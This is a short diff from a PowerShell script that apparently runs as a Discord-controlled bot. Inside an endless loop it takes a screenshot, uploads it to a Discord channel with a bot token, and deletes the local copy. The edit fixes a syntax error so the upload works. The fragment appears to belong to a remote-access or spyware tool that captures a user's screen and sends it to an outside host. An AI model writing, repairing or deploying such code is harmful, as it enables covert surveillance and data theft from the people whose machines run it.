@@ -79,7 +79,7 @@ while ($true) {
                 $webClient.Headers.Add("Authorization", "Bot $TOKEN")
                 $path = Get-Screenshot
                 if ($path) {
-                    $webClient.UploadFile("$baseUrl/channels/$($channel.id)/messages", "POST", $path}
+                    $webClient.UploadFile("$baseUrl/channels/$($channel.id)/messages", "POST", $path)
                     Remove-Item -Path $path
                 } else {
                     Send-DiscordMessage -channelID $channel.id -content "Failed to take screenshot."
